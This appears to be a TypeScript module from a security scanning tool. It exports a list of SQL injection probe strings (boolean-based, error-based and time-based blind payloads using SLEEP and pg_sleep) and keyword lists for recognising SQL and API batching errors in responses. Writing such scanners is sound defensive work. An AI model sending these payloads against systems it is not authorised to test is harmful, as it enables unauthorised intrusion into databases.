export const SQLInputs = [
  // Boolean Based SQL Injection
  "'OR 1=1'",
  "' OR '1'='1",
  "') OR ('1'='1",

  // Error Based SQL Injection
  "'",
  "';",
  '--',

  // Time-Based Blind SQL Injection
  'OR IF(1=1, SLEEP(5), 0)', // MySQL, MariaDB
  'OR pg_sleep(5)', // PostgreSQL
  'OR 1=(SELECT 1 FROM (SELECT SLEEP(5))A)', // Another example for MySQL
];
export const sqlErrorKeywords = [
  'syntax error',
  'unexpected',
  'mysql_fetch',
  'invalid query',
];
export const batchingErrorKeywords: string[] = [
  'too many operations',
  'batch size exceeds',
  'operation limit',
  'query complexity exceeds',
  'rate limit exceeded',
  'throttle',
  'unauthorized batch request',
  'unexpected token',
  'batching not supported',
  'anonymous operation',
  'must be the only defined operation',
  'batch',
  'rate limit',
  'server error',
  'API limit exceeded',
];
